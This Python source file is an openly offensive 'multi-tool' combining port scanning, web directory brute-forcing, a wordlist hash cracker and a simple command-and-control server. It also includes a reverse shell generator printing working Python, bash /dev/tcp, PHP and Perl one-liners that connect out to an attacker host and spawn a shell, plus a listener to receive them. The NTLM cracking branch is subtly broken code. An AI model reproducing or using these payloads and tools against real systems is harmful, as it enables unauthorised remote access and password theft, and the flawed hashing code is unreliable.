#!/usr/bin/env python3
import argparse
import asyncio
import base64
import dns.resolver
import hashlib
import json
import os
import random
import re
import socket
import ssl
import subprocess
import sys
import threading
import time
from concurrent.futures import ThreadPoolExecutor
from datetime import datetime
from queue import Queue

try:
    import scapy.all as scapy
except ImportError:
    print("Scapy not installed. Some features will be disabled.")
    
try:
    import nmap
except ImportError:
    print("python-nmap not installed. Nmap features will be disabled.")

try:
    import paramiko
except ImportError:
    print("Paramiko not installed. SSH features will be disabled.")

try:
    import requests
    from bs4 import BeautifulSoup
except ImportError:
    print("Requests/BeautifulSoup not installed. Web features will be disabled.")

try:
    from Cryptodome.Cipher import AES
    from Cryptodome.Random import get_random_bytes
except ImportError:
    print("PyCryptodome not installed. Crypto features will be disabled.")

class Colors:
    HEADER = '\033[95m'
    OKBLUE = '\033[94m'
    OKGREEN = '\033[92m'
    WARNING = '\033[93m'
    FAIL = '\033[91m'
    ENDC = '\033[0m'
    BOLD = '\033[1m'
    UNDERLINE = '\033[4m'

class OffensiveMultiTool:
    def __init__(self):
        self.banner = f"""{Colors.WARNING}
  ____         __  __
 / ___|_ __ ___\ \/ /
| |   | '__/ _ \\  /
| |___| | | (_) /  \
 \____|_|  \___/_/\_\
       
 
 {Colors.ENDC}{Colors.OKBLUE}Advanced CroX Multi-Tool{Colors.ENDC}
 {Colors.WARNING}Use responsibly and only on systems you own or have permission to test{Colors.ENDC}
"""
        print(self.banner)

    def run(self):
        parser = argparse.ArgumentParser(description="CroX Multi-Tool")
        subparsers = parser.add_subparsers(dest='command', help='Available commands')

        # Recon & Info Gathering
        recon_parser = subparsers.add_parser('recon', help='Reconnaissance and information gathering')
        recon_subparsers = recon_parser.add_subparsers(dest='recon_command')
        
        # DNS/WHOIS
        dns_parser = recon_subparsers.add_parser('dns', help='DNS information gathering')
        dns_parser.add_argument('domain', help='Domain to query')
        dns_parser.add_argument('--record-type', default='A', help='DNS record type to query (A, MX, NS, TXT, etc.)')
        
        # Port Scanning
        scan_parser = subparsers.add_parser('scan', help='Port scanning and enumeration')
        scan_parser.add_argument('target', help='Target IP or hostname')
        scan_parser.add_argument('-p', '--ports', default='1-1024', help='Port range to scan (default: 1-1024)')
        scan_parser.add_argument('-t', '--threads', type=int, default=10, help='Number of threads (default: 10)')
        scan_parser.add_argument('--scan-type', choices=['connect', 'syn', 'nmap'], default='connect', 
                                help='Scan type (connect, syn, nmap)')
        
        # Web Scanning
        web_parser = subparsers.add_parser('web', help='Web application scanning')
        web_subparsers = web_parser.add_subparsers(dest='web_command')
        
        dir_parser = web_subparsers.add_parser('dir', help='Directory brute-forcing')
        dir_parser.add_argument('url', help='Target URL')
        dir_parser.add_argument('-w', '--wordlist', default='common.txt', help='Wordlist file')
        dir_parser.add_argument('-e', '--extensions', default='', help='Extensions to try (comma-separated)')
        
        # Exploitation
        exploit_parser = subparsers.add_parser('exploit', help='Exploitation tools')
        exploit_subparsers = exploit_parser.add_subparsers(dest='exploit_command')
        
        # Reverse Shell
        shell_parser = exploit_subparsers.add_parser('shell', help='Reverse shell utilities')
        shell_subparsers = shell_parser.add_subparsers(dest='shell_command')
        
        shell_listen_parser = shell_subparsers.add_parser('listen', help='Start a listener')
        shell_listen_parser.add_argument('port', type=int, help='Port to listen on')
        
        shell_generate_parser = shell_subparsers.add_parser('generate', help='Generate reverse shell payload')
        shell_generate_parser.add_argument('host', help='Attacker host')
        shell_generate_parser.add_argument('port', type=int, help='Attacker port')
        shell_generate_parser.add_argument('--type', default='python', 
                                          choices=['python', 'bash', 'php', 'perl'], 
                                          help='Payload type')
        
        # Password Attacks
        pass_parser = subparsers.add_parser('password', help='Password attacks')
        pass_subparsers = pass_parser.add_subparsers(dest='pass_command')
        
        hash_parser = pass_subparsers.add_parser('hash', help='Hash cracking')
        hash_parser.add_argument('hash', help='Hash to crack')
        hash_parser.add_argument('--type', default='md5', 
                                choices=['md5', 'sha1', 'sha256', 'sha512', 'ntlm'], 
                                help='Hash type')
        hash_parser.add_argument('-w', '--wordlist', required=True, help='Wordlist file')
        
        # C2
        c2_parser = subparsers.add_parser('c2', help='Command and Control')
        c2_subparsers = c2_parser.add_subparsers(dest='c2_command')
        
        c2_server_parser = c2_subparsers.add_parser('server', help='Start C2 server')
        c2_server_parser.add_argument('port', type=int, help='Port to listen on')
        
        args = parser.parse_args()
        
        if not args.command:
            parser.print_help()
            return
        
        if args.command == 'recon':
            if args.recon_command == 'dns':
                self.dns_lookup(args.domain, args.record_type)
        elif args.command == 'scan':
            self.port_scan(args.target, args.ports, args.threads, args.scan_type)
        elif args.command == 'web':
            if args.web_command == 'dir':
                self.dir_bruteforce(args.url, args.wordlist, args.extensions)
        elif args.command == 'exploit':
            if args.exploit_command == 'shell':
                if args.shell_command == 'listen':
                    self.start_listener(args.port)
                elif args.shell_command == 'generate':
                    self.generate_reverse_shell(args.host, args.port, args.type)
        elif args.command == 'password':
            if args.pass_command == 'hash':
                self.crack_hash(args.hash, args.type, args.wordlist)
        elif args.command == 'c2':
            if args.c2_command == 'server':
                self.start_c2_server(args.port)

    def dns_lookup(self, domain, record_type):
        print(f"{Colors.OKBLUE}[*] Performing DNS lookup for {domain} (Record: {record_type}){Colors.ENDC}")
        
        try:
            if record_type.upper() == 'ANY':
                # Handle ANY query type carefully as it may be restricted
                for rtype in ['A', 'AAAA', 'MX', 'NS', 'TXT', 'SOA', 'CNAME']:
                    self.dns_lookup(domain, rtype)
                return
            
            answers = dns.resolver.resolve(domain, record_type)
            print(f"{Colors.OKGREEN}[+] {record_type} records for {domain}:{Colors.ENDC}")
            for rdata in answers:
                print(f"  {rdata}")
                
        except dns.resolver.NoAnswer:
            print(f"{Colors.WARNING}[-] No {record_type} records found for {domain}{Colors.ENDC}")
        except dns.resolver.NXDOMAIN:
            print(f"{Colors.FAIL}[-] Domain {domain} does not exist{Colors.ENDC}")
        except dns.resolver.Timeout:
            print(f"{Colors.FAIL}[-] DNS query timed out{Colors.ENDC}")
        except Exception as e:
            print(f"{Colors.FAIL}[-] Error in DNS lookup: {str(e)}{Colors.ENDC}")

    def port_scan(self, target, port_range, num_threads, scan_type):
        print(f"{Colors.OKBLUE}[*] Scanning {target} on ports {port_range} using {scan_type} scan{Colors.ENDC}")
        
        try:
            # Parse port range
            if '-' in port_range:
                start_port, end_port = map(int, port_range.split('-'))
            else:
                start_port = end_port = int(port_range)
            ports = range(start_port, end_port + 1)
            
            if scan_type == 'nmap' and 'nmap' in globals():
                self.nmap_scan(target, port_range)
                return
            
            open_ports = []
            q = Queue()
            
            for port in ports:
                q.put(port)
                
            def worker():
                while not q.empty():
                    port = q.get()
                    try:
                        if scan_type == 'syn' and 'scapy' in globals():
                            # SYN scan using Scapy
                            resp = scapy.sr1(scapy.IP(dst=target)/scapy.TCP(dport=port, flags="S"), timeout=1, verbose=0)
                            if resp and resp.haslayer(scapy.TCP):
                                if resp.getlayer(scapy.TCP).flags == 0x12:  # SYN-ACK
                                    open_ports.append(port)
                                    scapy.sr(scapy.IP(dst=target)/scapy.TCP(dport=port, flags="R"), timeout=1, verbose=0)
                        else:
                            # Regular connect scan
                            with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
                                s.settimeout(1)
                                result = s.connect_ex((target, port))
                                if result == 0:
                                    open_ports.append(port)
                    except:
                        pass
                    q.task_done()
            
            for _ in range(num_threads):
                t = threading.Thread(target=worker, daemon=True)
                t.start()
                
            q.join()
            
            if open_ports:
                print(f"{Colors.OKGREEN}[+] Open ports on {target}:{Colors.ENDC}")
                for port in sorted(open_ports):
                    try:
                        service = socket.getservbyport(port)
                        print(f"  {port}/tcp - {service}")
                    except:
                        print(f"  {port}/tcp - unknown")
            else:
                print(f"{Colors.WARNING}[-] No open ports found in range {port_range}{Colors.ENDC}")
                
        except Exception as e:
            print(f"{Colors.FAIL}[-] Error in port scan: {str(e)}{Colors.ENDC}")

    def nmap_scan(self, target, port_range):
        try:
            nm = nmap.PortScanner()
            print(f"{Colors.OKBLUE}[*] Starting Nmap scan...{Colors.ENDC}")
            nm.scan(hosts=target, ports=port_range)
            
            for host in nm.all_hosts():
                print(f"\n{Colors.OKGREEN}[+] Scan results for {host}:{Colors.ENDC}")
                print(f"State: {nm[host].state()}")
                
                for proto in nm[host].all_protocols():
                    print(f"\nProtocol: {proto}")
                    ports = nm[host][proto].keys()
                    
                    for port in sorted(ports):
                        state = nm[host][proto][port]['state']
                        service = nm[host][proto][port]['name']
                        product = nm[host][proto][port].get('product', '')
                        version = nm[host][proto][port].get('version', '')
                        extra = nm[host][proto][port].get('extrainfo', '')
                        
                        if state == 'open':
                            print(f"  {port}/{proto} - {service} {product} {version} {extra}")
        except Exception as e:
            print(f"{Colors.FAIL}[-] Nmap scan error: {str(e)}{Colors.ENDC}")

    def dir_bruteforce(self, url, wordlist_path, extensions):
        print(f"{Colors.OKBLUE}[*] Starting directory brute-force on {url}{Colors.ENDC}")
        
        if not url.startswith('http'):
            url = 'http://' + url
            
        try:
            extensions = ['.'+ext.strip() for ext in extensions.split(',')] if extensions else ['']
            
            try:
                with open(wordlist_path, 'r') as f:
                    words = [line.strip() for line in f if line.strip()]
            except FileNotFoundError:
                print(f"{Colors.FAIL}[-] Wordlist file not found: {wordlist_path}{Colors.ENDC}")
                return
                
            if not words:
                print(f"{Colors.WARNING}[-] Wordlist is empty{Colors.ENDC}")
                return
                
            found = []
            
            def check_path(path):
                try:
                    full_url = f"{url}/{path}" if not url.endswith('/') else f"{url}{path}"
                    r = requests.get(full_url, timeout=5, allow_redirects=False)
                    if r.status_code < 400 or r.status_code == 403:
                        found.append((full_url, r.status_code))
                        print(f"{Colors.OKGREEN}[+] Found: {full_url} ({r.status_code}){Colors.ENDC}")
                except:
                    pass
                    
            with ThreadPoolExecutor(max_workers=20) as executor:
                for word in words:
                    for ext in extensions:
                        path = word + ext
                        executor.submit(check_path, path)
                        
            if not found:
                print(f"{Colors.WARNING}[-] No paths found{Colors.ENDC}")
                
        except KeyboardInterrupt:
            print("\nScan interrupted by user")
        except Exception as e:
            print(f"{Colors.FAIL}[-] Error in directory brute-force: {str(e)}{Colors.ENDC}")

    def start_listener(self, port):
        print(f"{Colors.OKBLUE}[*] Starting listener on port {port}{Colors.ENDC}")
        print(f"{Colors.WARNING}[!] Use CTRL+C to stop{Colors.ENDC}")
        
        try:
            with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
                s.bind(('0.0.0.0', port))
                s.listen(5)
                print(f"{Colors.OKGREEN}[+] Listening for incoming connections...{Colors.ENDC}")
                
                conn, addr = s.accept()
                print(f"{Colors.OKGREEN}[+] Connection from {addr[0]}:{addr[1]}{Colors.ENDC}")
                
                while True:
                    cmd = input("shell> ")
                    if cmd.lower() in ['exit', 'quit']:
                        conn.send(b'exit\n')
                        break
                        
                    if cmd:
                        conn.send(cmd.encode() + b'\n')
                        output = conn.recv(4096).decode()
                        print(output)
                        
        except KeyboardInterrupt:
            print("\nListener stopped by user")
        except Exception as e:
            print(f"{Colors.FAIL}[-] Listener error: {str(e)}{Colors.ENDC}")

    def generate_reverse_shell(self, host, port, shell_type):
        print(f"{Colors.OKBLUE}[*] Generating {shell_type} reverse shell payload for {host}:{port}{Colors.ENDC}")
        
        payloads = {
            'python': f"""python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("{host}",{port}));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'""",
            'bash': f"bash -i >& /dev/tcp/{host}/{port} 0>&1",
            'php': f"""php -r '$sock=fsockopen("{host}",{port});exec("/bin/sh -i <&3 >&3 2>&3");'""",
            'perl': f"""perl -e 'use Socket;$i="{host}";$p={port};socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i))){{open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");}};'"""
        }
        
        if shell_type in payloads:
            print(f"\n{Colors.OKGREEN}{payloads[shell_type]}{Colors.ENDC}\n")
        else:
            print(f"{Colors.FAIL}[-] Unsupported shell type: {shell_type}{Colors.ENDC}")

    def crack_hash(self, target_hash, hash_type, wordlist_path):
        print(f"{Colors.OKBLUE}[*] Attempting to crack {hash_type} hash: {target_hash}{Colors.ENDC}")
        
        try:
            with open(wordlist_path, 'r', errors='ignore') as f:
                words = [line.strip() for line in f if line.strip()]
                
            if not words:
                print(f"{Colors.WARNING}[-] Wordlist is empty{Colors.ENDC}")
                return
                
            hash_funcs = {
                'md5': hashlib.md5,
                'sha1': hashlib.sha1,
                'sha256': hashlib.sha256,
                'sha512': hashlib.sha512,
                'ntlm': lambda x: hashlib.new('md4', x.encode('utf-16le')).hexdigest()
            }
            
            if hash_type not in hash_funcs:
                print(f"{Colors.FAIL}[-] Unsupported hash type: {hash_type}{Colors.ENDC}")
                return
                
            hash_func = hash_funcs[hash_type]
            start_time = time.time()
            found = False
            
            for word in words:
                hashed_word = hash_func(word.encode()).hexdigest()
                if hashed_word == target_hash.lower():
                    elapsed = time.time() - start_time
                    print(f"\n{Colors.OKGREEN}[+] Found password: {word} (in {elapsed:.2f} seconds){Colors.ENDC}")
                    found = True
                    break
                    
            if not found:
                elapsed = time.time() - start_time
                print(f"{Colors.WARNING}[-] Password not found in wordlist (tried {len(words)} words in {elapsed:.2f}s){Colors.ENDC}")
                
        except FileNotFoundError:
            print(f"{Colors.FAIL}[-] Wordlist file not found: {wordlist_path}{Colors.ENDC}")
        except Exception as e:
            print(f"{Colors.FAIL}[-] Error in hash cracking: {str(e)}{Colors.ENDC}")

    def start_c2_server(self, port):
        print(f"{Colors.OKBLUE}[*] Starting C2 server on port {port}{Colors.ENDC}")
        print(f"{Colors.WARNING}[!] Use CTRL+C to stop{Colors.ENDC}")
        
        try:
            with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
                s.bind(('0.0.0.0', port))
                s.listen(5)
                print(f"{Colors.OKGREEN}[+] C2 server listening...{Colors.ENDC}")
                
                conn, addr = s.accept()
                print(f"{Colors.OKGREEN}[+] Agent connected from {addr[0]}:{addr[1]}{Colors.ENDC}")
                
                while True:
                    cmd = input("c2> ")
                    if cmd.lower() in ['exit', 'quit']:
                        conn.send(b'exit\n')
                        break
                        
                    if cmd:
                        conn.send(cmd.encode() + b'\n')
                        output = conn.recv(4096).decode()
                        print(output)
                        
        except KeyboardInterrupt:
            print("\nC2 server stopped by user")
        except Exception as e:
            print(f"{Colors.FAIL}[-] C2 server error: {str(e)}{Colors.ENDC}")

if __name__ == "__main__":
    try:
        tool = OffensiveMultiTool()
        tool.run()
    except KeyboardInterrupt:
        print("\nOperation cancelled by user")
        sys.exit(0)
    except Exception as e:
        print(f"{Colors.FAIL}[-] Fatal error: {str(e)}{Colors.ENDC}")
        sys.exit(1)